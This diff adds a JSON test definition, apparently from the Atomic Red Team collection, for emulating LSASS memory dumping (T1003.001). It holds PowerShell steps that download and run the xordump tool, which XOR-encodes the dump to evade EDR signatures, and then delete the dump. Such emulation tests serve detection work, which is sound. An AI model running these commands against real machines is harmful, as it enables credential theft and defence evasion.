@@ -1,0 +1,111 @@
+{
+  "id": "86fc3f40-237f-4701-b155-81c01c48d697",
+  "name": "Dump LSASS.exe using imported Microsoft DLLs",
+  "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "cad8eeba-9307-4f6d-897b-86528dba3332",
+      "type": "execute-command",
+      "data": {
+        "command": "#{xordump_exe} -out #{output_file} -x 0x41\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5af946fe-35c2-4672-9cb6-fecf5c2470c8",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item #{output_file} -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "41b22426-abc1-4fb3-b07a-df388e3306c9",
+      "name": "Check dependency 1/1",
+      "description": "Computer must have xordump.exe\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "700e2113-1962-4898-8019-04916bd6f9ae",
+      "name": "Resolve dependency 1/1",
+      "description": "Computer must have xordump.exe\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile #{xordump_exe}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7c982da8-7034-403b-a259-b1ac8b264cc5",
+      "name": "Re-check dependency 1/1",
+      "description": "Computer must have xordump.exe\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "cad8eeba-9307-4f6d-897b-86528dba3332",
+      "p": "on-success",
+      "o": "5af946fe-35c2-4672-9cb6-fecf5c2470c8"
+    },
+    {
+      "s": "cad8eeba-9307-4f6d-897b-86528dba3332",
+      "p": "on-failure",
+      "o": "5af946fe-35c2-4672-9cb6-fecf5c2470c8"
+    },
+    {
+      "s": "41b22426-abc1-4fb3-b07a-df388e3306c9",
+      "p": "on-success",
+      "o": "cad8eeba-9307-4f6d-897b-86528dba3332"
+    },
+    {
+      "s": "41b22426-abc1-4fb3-b07a-df388e3306c9",
+      "p": "on-failure",
+      "o": "700e2113-1962-4898-8019-04916bd6f9ae"
+    },
+    {
+      "s": "700e2113-1962-4898-8019-04916bd6f9ae",
+      "p": "on-success",
+      "o": "7c982da8-7034-403b-a259-b1ac8b264cc5"
+    },
+    {
+      "s": "7c982da8-7034-403b-a259-b1ac8b264cc5",
+      "p": "on-failure",
+      "o": "cad8eeba-9307-4f6d-897b-86528dba3332"
+    }
+  ],
+  "tags": [
+    "T1003.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "xordump_exe",
+      "type": "path",
+      "description": "Path to xordump",
+      "value": "C:\\Windows\\Temp\\xordump.exe"
+    },
+    {
+      "name": "output_file",
+      "type": "path",
+      "description": "Path where resulting dump should be placed",
+      "value": "C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp"
+    }
+  ]
+}
